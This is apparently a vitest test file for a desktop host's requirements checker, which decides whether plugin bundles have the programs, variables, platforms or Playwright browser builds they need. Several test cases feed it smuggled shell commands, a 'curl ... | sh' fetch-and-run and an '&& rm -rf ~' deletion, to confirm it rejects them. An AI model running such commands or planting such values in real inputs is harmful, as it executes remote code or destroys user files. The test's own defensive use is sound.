/**
 * The Host check of what an optional bundle's rows need: each kind of need, the texts and fix a bundle declares, and a
 * bundle whose declaration is broken reporting a problem without stopping another bundle's answer.
 */
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { dirname, join } from 'node:path'
import { afterEach, describe, expect, it, vi } from 'vitest'
import { REQUIREMENT_ROUTES } from '../src/client/requirements-api.ts'
import { apply, checkRequirements, hostEnvironment, isMet, launchesChrome, type BundleToCheck, type CheckEnvironment, type Need } from '../src/requirements.ts'

const roots: string[] = []
afterEach(() => { for (const root of roots.splice(0)) rmSync(root, { recursive: true, force: true }) })

/** A computer with these files, variables and platform. */
function computer(files: readonly string[], env: Record<string, string> = {}, platform: NodeJS.Platform = 'linux'): CheckEnvironment {
  return {
    platform, env: { PATH: '/usr/bin:/opt/bin', ...env }, home: '/home/person', isExecutable: path => files.includes(path),
    exists: path => files.includes(path),
    readJson: (path) => { throw new Error(`unexpected read of ${path}`) },
    resolvePackage: (_from, name) => { throw new Error(`unexpected resolution of ${name}`) },
    homePath: (...segments) => join('/home/person/.delorun', ...segments),
  }
}

/** A bundle directory holding a package declaration. */
function bundle(declaration: unknown, rowIds: string[] = ['row']): BundleToCheck {
  const dir = mkdtempSync(join(tmpdir(), 'requirements-'))
  roots.push(dir)
  writeFileSync(join(dir, 'package.json'), JSON.stringify({ name: 'x', delorun: declaration === undefined ? {} : { requires: declaration } }))
  return { name: `@test/${dir.slice(-6)}`, dir, rowIds }
}

const program = { kind: 'program', names: ['tool'] }
const command = { kind: 'command', command: 'brew install tool' }

describe('a need', () => {
  it('finds a program on PATH, with Windows suffixes only on Windows', () => {
    const need = { kind: 'program', names: ['tool'] } satisfies Need
    expect(isMet(need, computer(['/opt/bin/tool']), '/bundle')).toBe(true)
    expect(isMet(need, computer(['/opt/bin/tool.exe']), '/bundle')).toBe(false)
    expect(isMet(need, { ...computer(['C:\\bin\\tool.cmd'], { PATH: 'C:\\bin' }, 'win32'), isExecutable: path => path.endsWith('tool.cmd') }, '/bundle')).toBe(true)
    expect(isMet(need, computer([]), '/bundle')).toBe(false)
  })

  it('finds a program at a listed absolute path when it is not on PATH', () => {
    const need = { kind: 'program', names: ['tool'], paths: ['/Applications/Tool'] } satisfies Need
    expect(isMet(need, computer(['/Applications/Tool']), '/bundle')).toBe(true)
    expect(isMet(need, computer([]), '/bundle')).toBe(false)
  })

  it('treats a variable that is unset or empty as unmet', () => {
    const need = { kind: 'env', name: 'SECRET' } satisfies Need
    expect(isMet(need, computer([], { SECRET: 'x' }), '/bundle')).toBe(true)
    expect(isMet(need, computer([], { SECRET: '' }), '/bundle')).toBe(false)
    expect(isMet(need, computer([]), '/bundle')).toBe(false)
  })

  it('meets a platform only on the platforms it lists', () => {
    const need = { kind: 'platform', os: ['darwin', 'linux'] } satisfies Need
    expect(isMet(need, computer([]), '/bundle')).toBe(true)
    expect(isMet(need, computer([], {}, 'win32'), '/bundle')).toBe(false)
  })
})

describe('checking bundles', () => {
  it('reports a met row as ready and an unmet row with its derived reason and fix', () => {
    const target = bundle({ row: { needs: [program], fix: command } })
    expect(checkRequirements([target], 'en', computer(['/usr/bin/tool'])).rows).toEqual([{ packageName: target.name, rowId: 'row', state: 'ready' }])
    expect(checkRequirements([target], 'en', computer([]))).toEqual({
      rows: [{ packageName: target.name, rowId: 'row', state: 'needs-setup', reason: 'Needs tool installed', fix: command }],
      problems: [],
    })
  })

  it('derives the reason from the first unmet need: a label, several names, a variable, a platform', () => {
    const reason = (need: unknown, language = 'en', host = computer([])): string | undefined => {
      const row = checkRequirements([bundle({ row: { needs: [need], fix: command } })], language, host).rows[0]
      return row?.state === 'needs-setup' ? row.reason : undefined
    }
    expect(reason({ ...program, names: ['a', 'b'] })).toBe('Needs a or b installed')
    expect(reason({ ...program, names: ['a', 'b'], label: 'Chrome or Chromium' })).toBe('Needs Chrome or Chromium installed')
    expect(reason({ kind: 'env', name: 'SECRET' })).toBe('Needs SECRET set')
    expect(reason({ kind: 'platform', os: ['darwin'] })).toBe('Not available on this kind of computer')
    expect(reason({ ...program, label: 'Chrome' }, 'zh')).toBe('需要安装 Chrome')
    expect(reason({ kind: 'env', name: 'SECRET' }, 'zh')).toBe('需要设置 SECRET')
  })

  it('clears on its own once the need is met, without a restart', () => {
    const target = bundle({ row: { needs: [program], fix: command } })
    const files: string[] = []
    const host = { ...computer([]), isExecutable: (path: string) => files.includes(path) }
    expect(checkRequirements([target], 'en', host).rows[0]?.state).toBe('needs-setup')
    files.push('/usr/bin/tool')
    expect(checkRequirements([target], 'en', host).rows[0]?.state).toBe('ready')
  })

  it('answers nothing for a bundle that declares no needs', () => {
    expect(checkRequirements([bundle(undefined)], 'en', computer([]))).toEqual({ rows: [], problems: [] })
  })

  it.each([
    ['an unknown kind of need', { row: { needs: [{ kind: 'gpu' }], fix: command } }],
    ['an empty list of needs', { row: { needs: [], fix: command } }],
    ['a relative program path', { row: { needs: [{ ...program, paths: ['bin/tool'] }], fix: command } }],
    ['an http docs link', { row: { needs: [program], fix: { kind: 'docs', url: 'http://example.com' } } }],
    ['a fix with an unknown field', { row: { needs: [program], fix: { ...command, shell: true } } }],
    ['a row the patch does not declare', { other: { needs: [program], fix: command } }],
  ])('reports %s as that bundle\'s problem, loudly, and never reads it as ready', (_label, declaration) => {
    const broken = bundle(declaration)
    const good = bundle({ row: { needs: [program], fix: command } })
    const answer = checkRequirements([broken, good], 'en', computer(['/usr/bin/tool']))
    expect(answer.problems).toHaveLength(1)
    expect(answer.problems[0]?.packageName).toBe(broken.name)
    expect(answer.problems[0]?.message).not.toBe('')
    expect(answer.rows).toEqual([{ packageName: good.name, rowId: 'row', state: 'ready' }])
  })

  it('reports an unreadable package as that bundle\'s problem', () => {
    const answer = checkRequirements([{ name: '@test/gone', dir: join(tmpdir(), 'requirements-does-not-exist'), rowIds: [] }], 'en', computer([]))
    expect(answer.problems).toHaveLength(1)
    expect(answer.rows).toEqual([])
  })
})

describe('a Playwright browser build', () => {
  const need: Need = { kind: 'playwright-browser', via: ['@test/provider', '@playwright/mcp'], browser: 'chromium' }
  const browsers = { browsers: [{ name: 'chromium', revision: '1243' }, { name: 'chromium-headless-shell', revision: '1243' }, { name: 'firefox', revision: '1532' }] }
  /** A computer whose packages lead from the bundle to `@playwright/mcp` 0.0.80 and its `playwright-core`. */
  function playwrightComputer(
    files: string[], env: Record<string, string> = {}, platform: NodeJS.Platform = 'linux', mcp: unknown = { name: '@playwright/mcp', version: '0.0.80' },
  ): CheckEnvironment {
    const manifests: Record<string, string> = {
      '@test/provider': '/bundle/node_modules/@test/provider/package.json',
      '@playwright/mcp': '/store/@playwright/mcp/package.json',
      'playwright-core': '/store/playwright-core/package.json',
    }
    return {
      ...computer(files, env, platform), exists: path => files.includes(path),
      resolvePackage: (_from, name) => manifests[name] ?? (() => { throw new Error(`cannot resolve ${name}`) })(),
      readJson: path => path === '/store/@playwright/mcp/package.json' ? mcp : browsers,
    }
  }
  const complete = (folder: string) => `/home/person/.cache/ms-playwright/${folder}/INSTALLATION_COMPLETE`

  it('needs the exact revision of the browser and its headless shell, and names the exact installer', () => {
    const target = bundle({ row: { needs: [need], fix: { kind: 'playwright-install' } } })
    const answer = (files: string[], language = 'en') => checkRequirements([target], language, playwrightComputer(files))
    expect(answer([complete('chromium-1228'), complete('chromium_headless_shell-1228')])).toEqual({
      rows: [{
        packageName: target.name, rowId: 'row', state: 'needs-setup', reason: 'Chromium download',
        fix: { kind: 'command', command: 'npx -y @playwright/mcp@0.0.80 install-browser chromium' },
      }],
      problems: [],
    })
    expect(answer([complete('chromium-1243')]).rows[0]?.state).toBe('needs-setup')
    expect(answer([complete('chromium-1243')], 'zh').rows[0]).toMatchObject({ reason: '需要下载 Chromium' })
    expect(answer([complete('chromium-1243'), complete('chromium_headless_shell-1243')]).rows).toEqual([{ packageName: target.name, rowId: 'row', state: 'ready' }])
  })

  describe('the browser its row launches', () => {
    const CHROME = '/opt/google/chrome/chrome'
    const built = [complete('chromium-1243'), complete('chromium_headless_shell-1243')]
    const target = (): BundleToCheck => bundle({ row: { needs: [need], fix: { kind: 'playwright-install' } } })
    const row = (files: string[], config?: unknown, language = 'en') =>
      checkRequirements([{ ...target(), ...config === undefined ? {} : { rowConfigs: { row: config } } }], language, playwrightComputer(files)).rows[0]
    const ready = { rowId: 'row', state: 'ready' }
    const chromium = { state: 'needs-setup', reason: 'Chromium download', fix: { kind: 'command', command: 'npx -y @playwright/mcp@0.0.80 install-browser chromium' } }

    it('is ready under auto with Chrome installed and no downloaded build, and needs the Chromium build without Chrome', () => {
      for (const config of [undefined, {}, { browser: 'auto' }, { mode: 'launch', headless: true }, 'not an object']) {
        expect(row([CHROME], config)).toMatchObject(ready)
        expect(row([], config)).toMatchObject(chromium)
        expect(row(built, config)).toMatchObject(ready)
      }
    })

    it('needs the Chromium build under chromium, whether or not Chrome is installed', () => {
      expect(row([CHROME], { browser: 'chromium' })).toMatchObject(chromium)
      expect(row([CHROME, ...built], { browser: 'chromium' })).toMatchObject(ready)
    })

    it('needs Google Chrome under chrome, whatever build is downloaded, and names the installer\'s chrome command', () => {
      expect(row(built, { browser: 'chrome' })).toMatchObject({
        state: 'needs-setup', reason: 'Needs Google Chrome installed', fix: { kind: 'command', command: 'npx -y @playwright/mcp@0.0.80 install-browser chrome' },
      })
      expect(row(built, { browser: 'chrome' }, 'zh')).toMatchObject({ reason: '需要安装 Google Chrome' })
      expect(row([CHROME], { browser: 'chrome' })).toMatchObject(ready)
    })

    it('looks for Chrome only where Playwright does, never on PATH', () => {
      expect(row(['/usr/bin/google-chrome', '/usr/bin/chrome', '/opt/bin/chrome'])).toMatchObject(chromium)
    })

    it('tests the downloaded build of another browser whatever the row\'s browser says', () => {
      const firefox = { ...need, browser: 'firefox' } satisfies Need
      expect(launchesChrome(firefox, { browser: 'chrome' }, playwrightComputer([CHROME]))).toBe(false)
      expect(isMet(firefox, playwrightComputer([CHROME]), '/bundle', { browser: 'chrome' })).toBe(false)
      expect(isMet(firefox, playwrightComputer([complete('firefox-1532')]), '/bundle', { browser: 'chrome' })).toBe(true)
    })

    it('reports a browser that is not auto, chrome or chromium as the bundle\'s problem', () => {
      const broken = target()
      const answer = checkRequirements([{ ...broken, rowConfigs: { row: { browser: 'edge' } } }], 'en', playwrightComputer([CHROME]))
      expect(answer).toEqual({ rows: [], problems: [{ packageName: broken.name, message: 'browser must be one of auto, chrome, chromium' }] })
    })
  })

  it('reads Playwright\'s cache where Playwright does', () => {
    const met = (files: string[], env: Record<string, string>, platform: NodeJS.Platform) =>
      isMet(need, playwrightComputer(files, env, platform), '/bundle')
    const both = (cache: string) => [`${cache}/chromium-1243/INSTALLATION_COMPLETE`, `${cache}/chromium_headless_shell-1243/INSTALLATION_COMPLETE`]
    expect(met(both('/elsewhere'), { PLAYWRIGHT_BROWSERS_PATH: '/elsewhere' }, 'linux')).toBe(true)
    expect(met(both('/store/playwright-core/.local-browsers'), { PLAYWRIGHT_BROWSERS_PATH: '0' }, 'linux')).toBe(true)
    expect(met(both('/xdg/ms-playwright'), { XDG_CACHE_HOME: '/xdg' }, 'linux')).toBe(true)
    expect(met(both('/home/person/Library/Caches/ms-playwright'), {}, 'darwin')).toBe(true)
    expect(met(both('/home/person/.cache/ms-playwright'), {}, 'darwin')).toBe(false)
    // An empty variable is unset, as it is for Playwright.
    expect(met(both('/home/person/.cache/ms-playwright'), { XDG_CACHE_HOME: '', PLAYWRIGHT_BROWSERS_PATH: '' }, 'linux')).toBe(true)
    expect(met(both('/local/ms-playwright'), { LOCALAPPDATA: '/local' }, 'win32')).toBe(true)
    expect(met(both('/home/person/AppData/Local/ms-playwright'), { LOCALAPPDATA: '' }, 'win32')).toBe(true)
  })

  it('resolves a relative cache in INIT_CWD, else in the one folder the server runs in, and otherwise reports it', () => {
    const env = { PLAYWRIGHT_BROWSERS_PATH: 'browsers' }
    const named = { ...need, server: 'playwright-mcp' } satisfies Need
    const both = (cache: string) => [`${cache}/chromium-1243/INSTALLATION_COMPLETE`, `${cache}/chromium_headless_shell-1243/INSTALLATION_COMPLETE`]
    const inHome = both('/home/person/.delorun/browser-use/playwright-mcp/browsers')
    const forced = { browser: 'chromium', serverDirectory: 'home' }
    expect(isMet(named, playwrightComputer(inHome, env), '/bundle', forced)).toBe(true)
    expect(isMet(named, playwrightComputer(both('/home/person/browsers'), env), '/bundle', forced)).toBe(false)
    expect(isMet(named, playwrightComputer(both('/started/here/browsers'), { ...env, INIT_CWD: '/started/here' }), '/bundle', forced)).toBe(true)
    expect(isMet(need, playwrightComputer(both('/started/here/browsers'), { ...env, INIT_CWD: '/started/here' }), '/bundle')).toBe(true)
    for (const [which, config] of [[named, { browser: 'chromium', serverDirectory: 'session' }], [named, { browser: 'chromium' }], [need, forced]] as const) {
      expect(() => isMet(which, playwrightComputer(inHome, { ...env, INIT_CWD: '' }), '/bundle', config))
        .toThrow('is a relative path, which Playwright reads in each chat\'s folder; set PLAYWRIGHT_BROWSERS_PATH to an absolute path')
    }
    const target = bundle({ row: { needs: [named], fix: { kind: 'playwright-install' } } })
    expect(checkRequirements([target], 'en', playwrightComputer([], env))).toMatchObject({ rows: [], problems: [{ packageName: target.name }] })
  })

  it.each([
    ['a name that is not an npm package name', { name: '@playwright/mcp; curl example.invalid | sh', version: '0.0.80' }],
    ['a name with a space', { name: 'mcp install-browser firefox', version: '0.0.80' }],
    ['a version range', { name: '@playwright/mcp', version: '^0.0.80' }],
    ['a version with a command after it', { name: '@playwright/mcp', version: '0.0.80 && rm -rf ~' }],
    ['a version tag', { name: '@playwright/mcp', version: 'latest' }],
  ])('reports %s in the installer\'s package as the bundle\'s problem, and shows no command', (_label, mcp) => {
    const target = bundle({ row: { needs: [need], fix: { kind: 'playwright-install' } } })
    const answer = checkRequirements([target], 'en', playwrightComputer([], {}, 'linux', mcp))
    expect(answer.rows).toEqual([])
    expect(answer.problems).toHaveLength(1)
    expect(JSON.stringify(answer)).not.toContain('npx')
  })

  it('accepts an exact prerelease version in the installer\'s command', () => {
    const target = bundle({ row: { needs: [need], fix: { kind: 'playwright-install' } } })
    const answer = checkRequirements([target], 'en', playwrightComputer([], {}, 'linux', { name: '@playwright/mcp', version: '0.0.81-alpha.2026-09-01' }))
    expect(answer.rows[0]).toMatchObject({ fix: { kind: 'command', command: 'npx -y @playwright/mcp@0.0.81-alpha.2026-09-01 install-browser chromium' } })
  })

  it.each([
    ['a package it cannot resolve', { row: { needs: [{ ...need, via: ['@test/missing'] }], fix: { kind: 'playwright-install' } } }],
    ['a browser its Playwright does not list', { row: { needs: [{ ...need, browser: 'webkit' }], fix: { kind: 'playwright-install' } } }],
    ['an installer fix without a Playwright browser need', { row: { needs: [program], fix: { kind: 'playwright-install' } } }],
    ['an unknown browser', { row: { needs: [{ ...need, browser: 'edge' }], fix: { kind: 'playwright-install' } } }],
    ['a server name that is not one folder name', { row: { needs: [{ ...need, server: '../elsewhere' }], fix: { kind: 'playwright-install' } } }],
  ])('reports %s as the bundle\'s problem', (_label, declaration) => {
    const answer = checkRequirements([bundle(declaration)], 'en', playwrightComputer([]))
    expect(answer.rows).toEqual([])
    expect(answer.problems).toHaveLength(1)
  })
})

describe('the real computer', () => {
  it('resolves a Playwright browser build through the bundle\'s installed packages', () => {
    const root = mkdtempSync(join(tmpdir(), 'requirements-playwright-'))
    roots.push(root)
    const write = (path: string, value: unknown): void => {
      mkdirSync(dirname(join(root, path)), { recursive: true })
      writeFileSync(join(root, path), JSON.stringify(value))
    }
    write('bundle/package.json', { name: '@test/bundle', version: '1.0.0' })
    write('bundle/node_modules/@test/provider/package.json', { name: '@test/provider', version: '1.0.0' })
    write('bundle/node_modules/@test/provider/node_modules/@playwright/mcp/package.json', { name: '@playwright/mcp', version: '0.0.80' })
    const core = 'bundle/node_modules/@test/provider/node_modules/@playwright/mcp/node_modules/playwright-core'
    write(`${core}/package.json`, { name: 'playwright-core', version: '1.63.0' })
    write(`${core}/browsers.json`, { browsers: [{ name: 'chromium', revision: '1243' }] })
    const host = { ...hostEnvironment(), env: { PLAYWRIGHT_BROWSERS_PATH: join(root, 'cache') } }
    const need: Need = { kind: 'playwright-browser', via: ['@test/provider', '@playwright/mcp'], browser: 'chromium' }
    expect(isMet(need, host, join(root, 'bundle'))).toBe(false)
    write('cache/chromium-1243/INSTALLATION_COMPLETE', '')
    expect(isMet(need, host, join(root, 'bundle'))).toBe(true)
  })

  it('finds an executable and refuses a file that is not executable, without running either', () => {
    const dir = mkdtempSync(join(tmpdir(), 'requirements-path-'))
    roots.push(dir)
    const run = join(dir, 'runnable'), plain = join(dir, 'plain')
    writeFileSync(run, '#!/bin/sh\nexit 7\n', { mode: 0o755 })
    writeFileSync(plain, 'data', { mode: 0o644 })
    const host = hostEnvironment()
    expect(host.isExecutable(run)).toBe(true)
    expect(host.isExecutable(plain)).toBe(process.platform === 'win32')
    expect(host.isExecutable(join(dir, 'missing'))).toBe(false)
  })
})

describe('the route', () => {
  it('registers one read-only route and answers the check in the asked language', async () => {
    const target = bundle({ row: { needs: [{ kind: 'env', name: 'REQUIREMENTS_SPEC_UNSET' }], fix: command } })
    const registered: Array<{ path: string, methods: string[], fetch: (request: Request) => Promise<Response> }> = []
    const scope = {
      connection: { fetch: { register: (route: (typeof registered)[number]) => { registered.push(route) } } },
      get: (name: string) => ({
        pluginManager: { listBundles: async () => [{ name: target.name, availability: 'profile', rows: [{ rowId: 'row' }] }] },
        profileContext: { installAnchor: target.dir, dir: target.dir },
      } as Record<string, unknown>)[name],
      logger: () => ({ warn: vi.fn() }),
    }
    apply({ inject: (_names: string[], callback: (scope: unknown) => void) => { callback(scope) } } as never)
    expect(registered).toHaveLength(1)
    expect(registered[0]).toMatchObject({ path: REQUIREMENT_ROUTES.check, methods: ['GET'] })
    // The bundle directory cannot be resolved from the scratch profile, so the route answers an empty check.
    const response = await registered[0]!.fetch(new Request(`http://localhost${REQUIREMENT_ROUTES.check}?language=zh`))
    expect(response.status).toBe(200)
    expect(response.headers.get('cache-control')).toBe('no-store')
    expect(await response.json()).toEqual({ rows: [], problems: [] })
  })

  it('checks each row with its Loader entry\'s configuration, and without one when the row has no entry', async () => {
    const profile = mkdtempSync(join(tmpdir(), 'requirements-profile-'))
    roots.push(profile)
    const write = (path: string, value: unknown): void => {
      mkdirSync(dirname(join(profile, path)), { recursive: true })
      writeFileSync(join(profile, path), JSON.stringify(value))
    }
    const need = { kind: 'playwright-browser', via: ['@test/provider', '@playwright/mcp'], browser: 'chromium' }
    write('package.json', { name: 'profile' })
    write('node_modules/@test/bundle/package.json', { name: '@test/bundle', delorun: { requires: { row: { needs: [need], fix: { kind: 'playwright-install' } } } } })
    write('node_modules/@test/bundle/node_modules/@test/provider/package.json', { name: '@test/provider', version: '1.0.0' })
    write('node_modules/@test/bundle/node_modules/@test/provider/node_modules/@playwright/mcp/package.json', { name: '@playwright/mcp', version: '0.0.80' })
    const core = 'node_modules/@test/bundle/node_modules/@test/provider/node_modules/@playwright/mcp/node_modules/playwright-core'
    write(`${core}/package.json`, { name: 'playwright-core', version: '1.63.0' })
    write(`${core}/browsers.json`, { browsers: [{ name: 'chromium', revision: '1243' }] })
    vi.stubEnv('PLAYWRIGHT_BROWSERS_PATH', join(profile, 'cache'))
    const check = async (entries?: unknown[]): Promise<unknown> => {
      const registered: Array<{ fetch: (request: Request) => Promise<Response> }> = []
      const services: Record<string, unknown> = {
        pluginManager: { listBundles: async () => [{ name: '@test/bundle', availability: 'profile', rows: [{ rowId: 'row' }] }] },
        profileContext: { installAnchor: join(profile, 'package.json'), dir: profile },
        ...entries === undefined ? {} : { loader: { entries: () => entries } },
      }
      const scope = {
        connection: { fetch: { register: (route: (typeof registered)[number]) => { registered.push(route) } } },
        get: (name: string) => services[name], logger: () => ({ warn: vi.fn() }),
      }
      apply({ inject: (_names: string[], callback: (scope: unknown) => void) => { callback(scope) } } as never)
      return (await registered[0]!.fetch(new Request(`http://localhost${REQUIREMENT_ROUTES.check}`))).json()
    }
    try {
      const chromium = { rows: [{ rowId: 'row', state: 'needs-setup', reason: 'Chromium download' }], problems: [] }
      // An entry for another row, and one without an id, leave this row without a configuration.
      expect(await check([{ options: { id: 'other', config: { browser: 'edge' } } }, { options: { config: { browser: 'edge' } } }])).toMatchObject(chromium)
      expect(await check([{ options: { id: 'row', config: { browser: 'chromium' } } }])).toMatchObject(chromium)
      expect(await check([{ options: { id: 'row', config: { browser: 'edge' } } }])).toEqual({
        rows: [], problems: [{ packageName: '@test/bundle', message: 'browser must be one of auto, chrome, chromium' }],
      })
      mkdirSync(join(profile, 'cache', 'chromium-1243'), { recursive: true })
      writeFileSync(join(profile, 'cache', 'chromium-1243', 'INSTALLATION_COMPLETE'), '')
      expect(await check([{ options: { id: 'row', config: { browser: 'chromium' } } }])).toEqual({ rows: [{ packageName: '@test/bundle', rowId: 'row', state: 'ready' }], problems: [] })
    } finally {
      vi.unstubAllEnvs()
    }
  })
})
